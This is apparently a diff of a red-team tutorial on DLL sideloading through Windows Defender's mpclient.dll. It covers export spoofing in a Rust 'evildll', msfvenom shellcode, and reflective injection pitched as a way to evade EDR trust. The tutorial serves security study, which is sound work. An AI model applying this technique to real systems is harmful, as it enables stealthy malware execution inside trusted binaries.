@@ -1,24 +1,81 @@
-# DLL HIJACKING
+# 🧨 DLL HIJACKING
+
+```Abusing Trusted Windows Binaries for Code Execution```
+
+<p align="center"> <img src="https://img.shields.io/badge/Platform-Windows-blue"> <img src="https://img.shields.io/badge/Language-Rust-orange"> <img src="https://img.shields.io/badge/Focus-Red%20Team-red"> <img src="https://img.shields.io/badge/Technique-DLL%20Hijacking-purple"> </p>
 
 ---
 
-## **What is DLL Injection?**
+## **🧠 What Is DLL Injection?**
 
-DLL injection is a technique used to alter the behavior of a running process by introducing external code into its address space. This external code is typically a Dynamic Link Library (DLL), which can be loaded and executed dynamically by the target process. By injecting a DLL, the attacker or developer can manipulate the process's functionality without modifying its original code.
+DLL injection is a technique used to alter the behavior of a running process by introducing external code into its address space. This external code is typically a Dynamic Link Library (DLL), which can be loaded and executed dynamically by the target process. 
+
+Once injected, the DLL runs inside the context of the victim process, allowing it to:
+
+- 🛠 Modify application behavior
+
+- 🕵️ Steal sensitive information
+
+- 🚪 Execute arbitrary code
+
+- 🧬 Bypass security controls
+
+While DLL injection can be used for debugging or instrumentation, it is also a core primitive in modern malware and APT tradecraft.
 
 This method leverages the capabilities of Windows' DLLs, which are designed to allow code and data to be shared among multiple applications. While DLL injection can be used for legitimate purposes, such as debugging and testing, it is also a common tactic in cyberattacks to execute malicious operations within a target process. The injected DLL can perform various actions, from altering the process's behavior to stealing sensitive information.
 
 ## How does DLL Injection Work?
 
-DLL injection works by introducing a dynamic link library (DLL) into the address space of a running process. This is typically achieved through several methods, each leveraging the inherent capabilities of Windows' DLLs. The process begins with identifying the target process into which the DLL will be injected. Once identified, the attacker or developer allocates memory within the target process to accommodate the DLL.
+```
+┌──────────────┐
+│ Target EXE   │
+│ (Signed)     │
+└──────┬───────┘
+       │ LoadLibrary()
+       ▼
+┌──────────────┐
+│   DLL Load   │  ← attacker-controlled
+│  (mpclient) │
+└──────┬───────┘
+       │
+       ▼
+┌──────────────┐
+│  Arbitrary   │
+│ Code Exec   │
+└──────────────┘
 
-Next, the DLL is written into the allocated memory space. This can be done using various techniques such as code injection, where the DLL is directly inserted into the process's memory, or reflective DLL injection, which loads the DLL from memory without relying on Windows API functions. After the DLL is successfully injected, the final step involves executing the code within the DLL to manipulate the target process's behavior.
+```
+---
 
-**There’s a database of hijackable dlls called hijacklibs**
+### Typical steps:
 
+- 🎯 Identify a target process
+
+- 🧠 Understand its DLL search order
+
+- 🧪 Find a missing or hijackable DLL
+
+- 📦 Place a malicious DLL earlier in the search path
+
+- 💥 Code execution inside a trusted process
+
+---
+
+### 📚 Hijackable DLL Database
+
+There’s an excellent public database of vulnerable binaries and hijackable DLLs:
 https://hijacklibs.net/
 
-**The one I’ll target is mpclient.dll. This is a dll loaded by windows defender.**
+---
+
+### 🎯 Target: mpclient.dll (Windows Defender)
+
+We’ll target mpclient.dll, a DLL loaded by Windows Defender.
+- #### This dll is loaded by windows defender is in fact vulnerable to dll hijacking.
+
+
+🛡️ Why this matters:
+Defender binaries are Microsoft-signed and commonly trusted by EDR solutions.
 
 ![Screenshot 2026-01-01 at 12.40.04 AM.png](DLL%20HIJACKING/Screenshot_2026-01-01_at_12.40.04_AM.png)
 
@@ -26,16 +83,26 @@ https://hijacklibs.net/
 
 ### mpclient.dll
 
-#### This dll is loaded by windows defender is in fact vulnerable to dll hijacking.
+#### 📌 Vulnerable Executables
 
-There are two executable inside windows defender directory that load or try to load mpclient.dll.
+Two Defender binaries attempt to load mpclient.dll:
 
-The following executables attempt to load `mpclien.dll`
+mpcmdrun.exe
+➜ Defender command-line management tool
+
+nissrv.exe
+➜ Network Inspection Service
+
+Both are excellent DLL sideloading targets.
+
+### The following executables attempt to load `mpclien.dll`
 
 - [`%PROGRAMFILES%\Windows Defender\mpcmdrun.exe`](https://hijacklibs.net/#app:%25PROGRAMFILES%25%5CWindows%20Defender%5Cmpcmdrun.exe)  - commandline management tool for defender.
 - [`%PROGRAMFILES%\Windows Defender\nissrv.exe`](https://hijacklibs.net/#app:%25PROGRAMFILES%25%5CWindows%20Defender%5Cnissrv.exe)
 
 ---
+
+### 🔬 Observing DLL Load Behavior (Procmon)
 
 Let’s watch the load of dll’s from these programs in procmon just to see what it looks like once we have known targets.
 
@@ -51,11 +118,16 @@ Procmon fillters.
 
 ![Screenshot 2026-01-01 at 12.55.01 AM.png](DLL%20HIJACKING/Screenshot_2026-01-01_at_12.55.01_AM.png)
 
-mpclinet.dll present in the original directory. but because we can copy this binary anywhere in the system and use it. It’s going to look like signed microsoft programis running the dll that we want to run if we move that file anywhere else. This technique sometime known as `dll side loading`. rather than dll hijacking.
+mpclinet.dll present in the original directory. but because we can copy this binary anywhere in the system and use it. It’s going to look like signed microsoft programis running the dll that we want to run if we move that file anywhere else. This technique sometime known as `🧬 dll side loading`. rather than dll hijacking.
 
 ![Screenshot 2026-01-01 at 12.58.49 AM.png](DLL%20HIJACKING/Screenshot_2026-01-01_at_12.58.49_AM.png)
 
 #### We don’t yet know the functions mpcmd or nissrv actually use inside the dll so first thing thing you might try is to write a dll that uses dll main to do what we want. That may not work depending on the dll is used in the binary. But we can always give it a try.
+
+### 🧪 First Attempt: Minimal Evil DLL
+
+### 🎯 Goal:
+See whether the target calls DllMain at load time.
 
 here we have a evil.dll program in rust.
 
@@ -63,7 +135,7 @@ here we have a evil.dll program in rust.
 cargo new --lib evildll
 ```
 
-Cargo.toml
+- Cargo.toml
 
 ```toml
 [package]
@@ -90,7 +162,7 @@ features = [
 ]
 ```
 
-lib.rs
+- lib.rs
 
 ```rust
 use windows::{
@@ -161,9 +233,17 @@ This time we get.
 
 ![Screenshot 2026-01-01 at 1.17.33 AM.png](DLL%20HIJACKING/Screenshot_2026-01-01_at_1.17.33_AM.png)
 
+---
+
+### 🧠 Key Discovery: Imported Functions Matter
+
+**Windows doesn’t just load the DLL — it expects specific exports.**
+
 #### So we now know about two different functions that these libraries required and we need to spoof them at least those in order for this to work. 
 
 #### In order for us to understand all of the functions we’re going to need to spoof.
+
+### 🔎 Reverse Engineering the Imports
 
 Let’s use cutter to examine these programs.
 
@@ -183,7 +263,7 @@ We don’t need to read assembly for this part.
 
 #### First thing we want to do is get list of functions. get it out of cutter into something more usable.
 
-#### **Unfortunately we can not copy all these from cutter we have to use PESTUDIO.**
+### **Unfortunately we can not copy all these from cutter we have to use PESTUDIO.**
 
 Select all the mpclient.dll imports.
 
@@ -240,6 +320,8 @@ MpManagerStatusQueryEx
 
 ---
 
+### 🎭 Function Spoofing Strategy
+
 Replace the beginning of the line with `extern “C” fn main` 
 
 ![Screenshot 2026-01-01 at 1.38.22 AM.png](DLL%20HIJACKING/Screenshot_2026-01-01_at_1.38.22_AM.png)
@@ -259,6 +341,8 @@ Lastly edit beginning of line with `#[unsafe(no_mangle)]\n`
 now copy all and move it to [lib.rs](http://lib.rs) and remove the main function invocation.
 
 like this
+
+- lib.rs
 
 ```bash
 use windows::{
@@ -395,9 +479,12 @@ extern "system" fn DllMain(
 
 now build it again.
 
+### ✅ Successful Hijack
+
 ```bash
 cargo build --release --target x86_64-pc-windows-gnu
 ```
+---
 
 now copy our dll to the same directory where our defender binaries are.
 
@@ -414,6 +501,8 @@ And this time we get our popup msg.
 ### - Observe what it imports then write same functions that call your evil function inside of your rust program or any other language.
 
 ---
+
+### 🧠 Why Not Just Spoof One Function?
 
 ### So you may ask hey if we saw that error message when we tried to run MpCmdRun.exe with the dll without these spoofed functions. Couldn’t we just use that entry point and then just spoof that one. Wouldn’t that be enough.
 
@@ -449,9 +538,15 @@ so what let’s add `MpGetSampleChunk` and compile it it again.
 
 Okay now that we have the theory of the shim functions out of the way it’s time to weaponize this thing and actually add some offensive capabilities to our malicious dll we’re going to do that with process injection which is a way of injecting our own Shell Code into a running process into a running process either the one we’re currently in which is known as reflective injection or another process that we can gain access to gain a handle to that’s called remote process injection.
 
-## **Red team threat emulation - Process Injection**
+
+### 🔴 Weaponization: Process Injection
+We inject shellcode into memory using reflective injection.
+
+#### **Red team threat emulation - Process Injection**
 
 ---
+
+### 📡 Real-World Threat Intel
 
 There’s a article from trend micro talks about the Earth Longzhi (a [subgroup of APT41](https://www.trendmicro.com/en_us/research/22/k/hack-the-real-box-apt41-new-subgroup-earth-longzhi.html)) t that in fact uses dll hijacking with this very dll mpclient.dll. 
 
@@ -459,7 +554,7 @@ There’s a article from trend micro talks about the Earth Longzhi (a [subgroup 
 
 ### So knowing how to move from that hijack to actual remote code execution os pretty valuable. One of the most common things you’re going to want to do is to establish a command and control beacon so that we have initial access or persistence. on the target. for simplicity sake i’ll spawn a calculator.
 
-## Generate Payload
+## 💣 Payload Generation (msfvenom)
 
 I’ll be using msfvenom to generate a shellcode which will spawn a calculator.
 
@@ -474,9 +569,44 @@ Saved as: shellcode.bin
 
 ---
 
-## Evill dll
+## 🧬 Final Evil DLL (With Injection)
+Using the bolus crate, we:
+
+- Download shellcode
+- Inject it reflectively
+- Execute inside Defender
 
 No we’ll modify our evildll code.
+
+- Add bolus to Cargo.toml
+
+```toml
+[package]
+name = "mpclient"
+version = "0.48.0"
+edition = "2024"
+
+[lib]
+crate-type = ["cdylib"]
+
+[dependencies]
+bolus = "0.3.0"
+
+[dependencies.windows]
+version = "0.48.0"
+features = [
+	"Win32_Foundation",
+	"Win32_System_SystemServices",
+	"Win32_Security",
+	"Win32_System_Memory",
+	"Win32_System_Threading",
+	"Win32_System_WindowsProgramming",
+	"Win32_System_Diagnostics_Debug",
+	"Win32_UI_WindowsAndMessaging"
+]
+```
+
+---
 
 - lib.rs
 
@@ -621,35 +751,6 @@ extern "system" fn DllMain(
 }
 ```
 
----
-
-- Add bolus to Cargo.toml
-
-```toml
-[package]
-name = "mpclient"
-version = "0.48.0"
-edition = "2024"
-
-[lib]
-crate-type = ["cdylib"]
-
-[dependencies]
-bolus = "0.3.0"
-
-[dependencies.windows]
-version = "0.48.0"
-features = [
-	"Win32_Foundation",
-	"Win32_System_SystemServices",
-	"Win32_Security",
-	"Win32_System_Memory",
-	"Win32_System_Threading",
-	"Win32_System_WindowsProgramming",
-	"Win32_System_Diagnostics_Debug",
-	"Win32_UI_WindowsAndMessaging"
-]
-```
 
 ---
 
@@ -658,3 +759,4 @@ Recompile it and execute it.
 ![Screen Recording 2026-01-01 at 12.gif](DLL%20HIJACKING/Screen_Recording_2026-01-01_at_12.gif)
 
 ---
+
